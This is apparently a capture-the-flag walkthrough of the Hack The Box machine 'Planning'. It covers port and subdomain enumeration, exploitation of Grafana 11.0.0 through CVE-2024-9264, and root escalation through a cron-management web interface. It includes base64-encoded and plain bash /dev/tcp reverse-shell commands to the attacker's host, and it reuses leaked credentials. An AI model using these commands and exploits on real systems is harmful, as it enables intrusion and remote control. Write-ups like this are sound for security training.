---
name: Planning
difficulty: easy
os: linux
platform: htb

img: https://labs.hackthebox.com/storage/avatars/c9efb253e7d1d9b407113e11afdaa905.png
---

## Enumeration

### Port Scan

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.68 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80 -sCV 10.10.11.68 -o targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62fff6d4578805adf4d3de5b9bf850f1 (ECDSA)
|_  256 4cce7d5cfb2da09e9fbdf55c5e61508a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Edukate - Online Education Website
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see, there is a web service running on port 80. This website redirects us to `http://planning.htb`, so it is necessary to add the domain to our `/etc/hosts` file:
```bash
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```

We will try to detect the web application framework using `whatweb`:
```bash
whatweb http://planning.htb
```
```
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```

We will do a directory enumeration scan using `gobuster` to enumerate the web application:
```bash
gobuster dir -u http://planning.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://planning.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://planning.htb/css/]
/img                  (Status: 301) [Size: 178] [--> http://planning.htb/img/]
/index.php            (Status: 200) [Size: 23914]
/js                   (Status: 301) [Size: 178] [--> http://planning.htb/js/]
/lib                  (Status: 301) [Size: 178] [--> http://planning.htb/lib/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

As nothing interesting was found in directory enumeration and web application content, we will proceed with subdomain enumeration using `ffuf`:
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://planning.htb -H "Host: FUZZ.planning.htb" -fs 0
```
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 237ms]
```
We should add the subdomain `grafana.planning.htb` to our `/etc/hosts` file:
```bash
10.10.11.68 planning.htb grafana.planning.htb
```

## User Exploitation

We access grafana at `http://grafana.planning.htb` and we are greeted with a login page. 
We can log in using credentials given in the description of the machine:
```
Username: admin
Password: 0D5oT70Fq13EvB5r
```

We can check grafana version in `http://grafana.planning.htb/api/health`, we see that is running version `11.0.0`

We can use `https://github.com/nollium/CVE-2024-9264` to exploit a vulnerability in Grafana 11.0.0 that allows us to execute arbitrary code.
We clone the repository and run the exploit:
```bash
git clone https://github.com/nollium/CVE-2024-9264.git
cd CVE-2024-9264
pip install -r requirements.txt
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c <shell-cmd> http://grafana.planning.htb
``` 
We will encode base64 the following code to get a reverse shell:
```bash
echo "sh -i >& /dev/tcp/10.10.16.69/4444 0>&1" | base64
```

Then we run the exploit with the encoded command:
```bash
python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjkvNDQ0NCAwPiYxCg | base64 -d | bash'  http://grafana.planning.htb
```

We are in a Docker container. We can check by running the following command:
```bash
hostname -I
```
```
172.17.0.2
```
We can get credentials on ENV variables:
```bash
env
```
```
...
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
...
```

We can use these credentials to login via ssh
```bash
ssh enzo@planning.htb
```

We can find the user flag in the home directory:
```bash
cat /home/enzo/user.txt
```
```
user flag value
```

## Root Exploitation

We can check if user `enzo` has sudo privileges:
```bash
sudo -l
```
```
Sorry, user enzo may not run sudo on planning.
```

We run `linpeas` to check for privilege escalation vectors:
```bash
./linpeas.sh
```
Found /opt/crontabs/crontab.db: New Line Delimited JSON text data
```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
```

Also found a service running on port 8000, which is not accesible from outside the machine. We do a port forwarding to access it:
```bash
ssh -L 8000:localhost:8000 enzo@planning.htb
```

We can access the service at `http://localhost:8000` and we are greeted with a login page. We can log in using the credentials we found in the crontab:
```
Username: root
Password: P4ssw0rdS0pRi0T3c
```

We can see a web interface that allows users to manage crontab jobs which will be runned by root. We can create a new job that will create a reverse shell for us. We can use the following command to create a new job:
```bash
bash -c "sh -i >& /dev/tcp/10.10.16.69/4444 0>&1"
```

Once the job is created we can run it by clicking on the "Run" button. This will execute the command as root and give us a reverse shell.

We get access to the root reverse shell:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion

This walkthrough demonstrated how to exploit a vulnerable Grafana instance to gain user access and then escalate privileges to root using a custom cron job. The process involved enumeration, exploiting a known vulnerability, and leveraging Docker container management to achieve the final goal of obtaining the root flag. 
